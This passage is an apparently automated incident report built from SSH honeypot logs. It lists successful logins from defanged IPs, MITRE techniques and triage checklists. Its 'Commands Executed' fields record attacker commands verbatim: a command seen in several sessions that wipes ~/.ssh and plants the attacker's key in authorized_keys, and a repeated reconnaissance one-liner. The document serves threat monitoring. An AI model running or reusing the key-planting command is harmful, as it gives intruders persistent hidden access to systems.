| `2026-09-08 04:18:31` | `cowrie.client.kex` |
| `2026-09-08 04:18:32` | `cowrie.login.success` |
| `2026-09-08 04:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.238.108[.]95` to AbuseIPDB if not already reported
- [ ] Block `47.238.108[.]95` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0389f3fa089

| Field | Detail |
|---|---|
| **Source IP** | `47.237.72[.]129` |
| **First Seen** | 2026-09-08 04:20 |
| **Last Seen** | 2026-09-08 04:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:20:17` | `cowrie.session.connect` |
| `2026-09-08 04:20:17` | `cowrie.client.version` |
| `2026-09-08 04:20:17` | `cowrie.client.kex` |
| `2026-09-08 04:20:18` | `cowrie.login.success` |
| `2026-09-08 04:20:19` | `cowrie.session.params` |
| `2026-09-08 04:20:19` | `cowrie.command.input` |
| `2026-09-08 04:20:19` | `cowrie.command.failed` |
| `2026-09-08 04:20:19` | `cowrie.log.closed` |
| `2026-09-08 04:20:20` | `cowrie.session.params` |
| `2026-09-08 04:20:20` | `cowrie.command.input` |
| `2026-09-08 04:20:20` | `cowrie.session.file_download` |
| `2026-09-08 04:20:20` | `cowrie.log.closed` |
| `2026-09-08 04:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.72[.]129` to AbuseIPDB if not already reported
- [ ] Block `47.237.72[.]129` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4a2b93ce89e

| Field | Detail |
|---|---|
| **Source IP** | `47.237.72[.]129` |
| **First Seen** | 2026-09-08 04:20 |
| **Last Seen** | 2026-09-08 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:20:21` | `cowrie.session.connect` |
| `2026-09-08 04:20:21` | `cowrie.client.version` |
| `2026-09-08 04:20:21` | `cowrie.client.kex` |
| `2026-09-08 04:20:22` | `cowrie.login.success` |
| `2026-09-08 04:20:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.72[.]129` to AbuseIPDB if not already reported
- [ ] Block `47.237.72[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-461803bed0e0

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]115` |
| **First Seen** | 2026-09-08 04:20 |
| **Last Seen** | 2026-09-08 04:25 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:20:22` | `cowrie.session.connect` |
| `2026-09-08 04:20:22` | `cowrie.client.version` |
| `2026-09-08 04:20:22` | `cowrie.client.kex` |
| `2026-09-08 04:20:23` | `cowrie.login.success` |
| `2026-09-08 04:20:24` | `cowrie.session.params` |
| `2026-09-08 04:20:24` | `cowrie.command.input` |
| `2026-09-08 04:20:24` | `cowrie.command.failed` |
| `2026-09-08 04:20:25` | `cowrie.log.closed` |
| `2026-09-08 04:20:26` | `cowrie.session.params` |
| `2026-09-08 04:20:26` | `cowrie.command.input` |
| `2026-09-08 04:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.238[.]115` to AbuseIPDB if not already reported
- [ ] Block `118.145.238[.]115` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc77c20a042

| Field | Detail |
|---|---|
| **Source IP** | `47.237.72[.]129` |
| **First Seen** | 2026-09-08 04:20 |
| **Last Seen** | 2026-09-08 04:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:20:22` | `cowrie.session.connect` |
| `2026-09-08 04:20:22` | `cowrie.client.version` |
| `2026-09-08 04:20:22` | `cowrie.client.kex` |
| `2026-09-08 04:20:23` | `cowrie.login.success` |
| `2026-09-08 04:20:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.237.72[.]129` to AbuseIPDB if not already reported
- [ ] Block `47.237.72[.]129` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34934ea413ab

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:23 |
| **Last Seen** | 2026-09-08 04:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:23:53` | `cowrie.session.connect` |
| `2026-09-08 04:23:54` | `cowrie.client.version` |
| `2026-09-08 04:23:54` | `cowrie.client.kex` |
| `2026-09-08 04:23:57` | `cowrie.login.success` |
| `2026-09-08 04:23:59` | `cowrie.session.params` |
| `2026-09-08 04:23:59` | `cowrie.command.input` |
| `2026-09-08 04:23:59` | `cowrie.log.closed` |
| `2026-09-08 04:24:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c8f34923aa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:26 |
| **Last Seen** | 2026-09-08 04:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:26:10` | `cowrie.session.connect` |
| `2026-09-08 04:26:11` | `cowrie.client.version` |
| `2026-09-08 04:26:11` | `cowrie.client.kex` |
| `2026-09-08 04:26:13` | `cowrie.login.success` |
| `2026-09-08 04:26:14` | `cowrie.session.params` |
| `2026-09-08 04:26:14` | `cowrie.command.input` |
| `2026-09-08 04:26:15` | `cowrie.log.closed` |
| `2026-09-08 04:26:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3f832e55496

| Field | Detail |
|---|---|
| **Source IP** | `164.152.250[.]192` |
| **First Seen** | 2026-09-08 04:28 |
| **Last Seen** | 2026-09-08 04:28 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:28:12` | `cowrie.session.connect` |
| `2026-09-08 04:28:12` | `cowrie.client.version` |
| `2026-09-08 04:28:13` | `cowrie.client.kex` |
| `2026-09-08 04:28:13` | `cowrie.login.success` |
| `2026-09-08 04:28:14` | `cowrie.session.params` |
| `2026-09-08 04:28:14` | `cowrie.command.input` |
| `2026-09-08 04:28:14` | `cowrie.command.failed` |
| `2026-09-08 04:28:15` | `cowrie.log.closed` |
| `2026-09-08 04:28:16` | `cowrie.session.params` |
| `2026-09-08 04:28:16` | `cowrie.command.input` |
| `2026-09-08 04:28:16` | `cowrie.session.file_download` |
| `2026-09-08 04:28:16` | `cowrie.log.closed` |
| `2026-09-08 04:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.152.250[.]192` to AbuseIPDB if not already reported
- [ ] Block `164.152.250[.]192` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b62ba7b4881b

| Field | Detail |
|---|---|
| **Source IP** | `164.152.250[.]192` |
| **First Seen** | 2026-09-08 04:28 |
| **Last Seen** | 2026-09-08 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:28:16` | `cowrie.session.connect` |
| `2026-09-08 04:28:16` | `cowrie.client.version` |
| `2026-09-08 04:28:16` | `cowrie.client.kex` |
| `2026-09-08 04:28:17` | `cowrie.login.success` |
| `2026-09-08 04:28:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.152.250[.]192` to AbuseIPDB if not already reported
- [ ] Block `164.152.250[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e26b99f4a68

| Field | Detail |
|---|---|
| **Source IP** | `164.152.250[.]192` |
| **First Seen** | 2026-09-08 04:28 |
| **Last Seen** | 2026-09-08 04:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:28:17` | `cowrie.session.connect` |
| `2026-09-08 04:28:17` | `cowrie.client.version` |
| `2026-09-08 04:28:18` | `cowrie.client.kex` |
| `2026-09-08 04:28:18` | `cowrie.login.success` |
| `2026-09-08 04:28:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.152.250[.]192` to AbuseIPDB if not already reported
- [ ] Block `164.152.250[.]192` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee925c0f46c4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:28 |
| **Last Seen** | 2026-09-08 04:28 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:28:32` | `cowrie.session.connect` |
| `2026-09-08 04:28:32` | `cowrie.client.version` |
| `2026-09-08 04:28:32` | `cowrie.client.kex` |
| `2026-09-08 04:28:34` | `cowrie.login.success` |
| `2026-09-08 04:28:35` | `cowrie.session.params` |
| `2026-09-08 04:28:35` | `cowrie.command.input` |
| `2026-09-08 04:28:35` | `cowrie.log.closed` |
| `2026-09-08 04:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b0263d8da70d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:30 |
| **Last Seen** | 2026-09-08 04:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:30:57` | `cowrie.session.connect` |
| `2026-09-08 04:30:57` | `cowrie.client.version` |
| `2026-09-08 04:30:57` | `cowrie.client.kex` |
| `2026-09-08 04:30:58` | `cowrie.login.success` |
| `2026-09-08 04:30:59` | `cowrie.session.params` |
| `2026-09-08 04:30:59` | `cowrie.command.input` |
| `2026-09-08 04:30:59` | `cowrie.log.closed` |
| `2026-09-08 04:30:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee8782569ab5

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:33 |
| **Last Seen** | 2026-09-08 04:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:33:25` | `cowrie.session.connect` |
| `2026-09-08 04:33:25` | `cowrie.client.version` |
| `2026-09-08 04:33:25` | `cowrie.client.kex` |
| `2026-09-08 04:33:26` | `cowrie.login.success` |
| `2026-09-08 04:33:27` | `cowrie.session.params` |
| `2026-09-08 04:33:27` | `cowrie.command.input` |
| `2026-09-08 04:33:27` | `cowrie.log.closed` |
| `2026-09-08 04:33:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ed9e233247c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:35 |
| **Last Seen** | 2026-09-08 04:35 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:35:42` | `cowrie.session.connect` |
| `2026-09-08 04:35:42` | `cowrie.client.version` |
| `2026-09-08 04:35:42` | `cowrie.client.kex` |
| `2026-09-08 04:35:43` | `cowrie.login.success` |
| `2026-09-08 04:35:44` | `cowrie.session.params` |
| `2026-09-08 04:35:44` | `cowrie.command.input` |
| `2026-09-08 04:35:44` | `cowrie.log.closed` |
| `2026-09-08 04:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adfb1569a867

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:38 |
| **Last Seen** | 2026-09-08 04:38 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:38:06` | `cowrie.session.connect` |
| `2026-09-08 04:38:06` | `cowrie.client.version` |
| `2026-09-08 04:38:06` | `cowrie.client.kex` |
| `2026-09-08 04:38:07` | `cowrie.login.success` |
| `2026-09-08 04:38:09` | `cowrie.session.params` |
| `2026-09-08 04:38:09` | `cowrie.command.input` |
| `2026-09-08 04:38:09` | `cowrie.log.closed` |
| `2026-09-08 04:38:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b3a114033a1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:42 |
| **Last Seen** | 2026-09-08 04:42 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:42:22` | `cowrie.session.connect` |
| `2026-09-08 04:42:22` | `cowrie.client.version` |
| `2026-09-08 04:42:22` | `cowrie.client.kex` |
| `2026-09-08 04:42:24` | `cowrie.login.success` |
| `2026-09-08 04:42:24` | `cowrie.session.params` |
| `2026-09-08 04:42:24` | `cowrie.command.input` |
| `2026-09-08 04:42:25` | `cowrie.log.closed` |
| `2026-09-08 04:42:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e62458aaf4f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:44 |
| **Last Seen** | 2026-09-08 04:44 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:44:42` | `cowrie.session.connect` |
| `2026-09-08 04:44:43` | `cowrie.client.version` |
| `2026-09-08 04:44:43` | `cowrie.client.kex` |
| `2026-09-08 04:44:44` | `cowrie.login.success` |
| `2026-09-08 04:44:45` | `cowrie.session.params` |
| `2026-09-08 04:44:45` | `cowrie.command.input` |
| `2026-09-08 04:44:45` | `cowrie.log.closed` |
| `2026-09-08 04:44:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef003d09c2d0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:47 |
| **Last Seen** | 2026-09-08 04:47 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:${PATH:-} LC_ALL=C LANG=C; uname=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -s -v -n -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; IFS= read -r v < /proc/version && printf '%s\n' "$v") 2>/dev/null; arch=$(for c in uname /bin/uname /usr/bin/uname 'busybox uname' 'toybox uname'; do v=$($c -m 2>/dev/null) && [ -n "$v" ] && { printf '%s\n' "$v"; exit; }; done; for c in arch` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-08 04:47:05` | `cowrie.session.connect` |
| `2026-09-08 04:47:05` | `cowrie.client.version` |
| `2026-09-08 04:47:05` | `cowrie.client.kex` |
| `2026-09-08 04:47:07` | `cowrie.login.success` |
| `2026-09-08 04:47:08` | `cowrie.session.params` |
| `2026-09-08 04:47:08` | `cowrie.command.input` |
| `2026-09-08 04:47:09` | `cowrie.log.closed` |
| `2026-09-08 04:47:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]50` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]50` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e6cacaf55c6

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]50` |
| **First Seen** | 2026-09-08 04:49 |
| **Last Seen** | 2026-09-08 04:49 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
